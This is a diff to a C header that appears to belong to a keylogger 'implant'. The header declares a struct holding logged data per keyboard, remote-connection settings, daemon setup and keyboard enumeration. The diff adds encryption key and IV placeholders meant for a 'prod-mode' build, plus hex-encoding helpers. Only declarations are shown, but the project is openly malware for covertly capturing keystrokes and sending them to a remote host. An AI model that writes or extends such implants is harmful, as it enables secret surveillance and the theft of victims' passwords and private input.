@@ -16,6 +16,17 @@
 #define QUEUE_BUFFER_SIZE 1024
 #define STRING_BUFFER_SIZE 256
 
+
+/* will be overriden at compile-time if prod-mode enabled */
+#define BLOCK_SIZE 64
+#define KEY_SIZE 32
+#define IV_SIZE 8
+
+#define BLOCK   ("")
+#define KEY     ("")
+#define IV      ("")
+
+
 /*
     represents whatever data is currently logged for a single keyboard
     also holds its file descriptor
@@ -40,7 +51,6 @@ struct keyboard_s {
 typedef struct implant_s {
 
     /* remote connection settings */
-    uint16_t port;
     int8_t ip[STRING_BUFFER_SIZE];
     uint8_t disable_net;
 
@@ -82,11 +92,14 @@ void daemon_setup(void);
 // kbd.c
 uint8_t fetch_available_keyboards(implant_t *instance);
 
+
 // utils.c
 int8_t file_get_contents(int8_t const *, int8_t **);
 int8_t *remove_repeating_whitespaces(int8_t *);
 uint32_t array_get_size(int8_t **);
 void array_free(int8_t **);
 int8_t **array_from_string(const int8_t *, int8_t);
+int8_t ascii_to_hex(char input[STRING_BUFFER_SIZE / 2], char output[STRING_BUFFER_SIZE]);
+int8_t hex_to_ascii(char input[STRING_BUFFER_SIZE], char output[STRING_BUFFER_SIZE]);
 
 #endif /* IMPLANT_H */
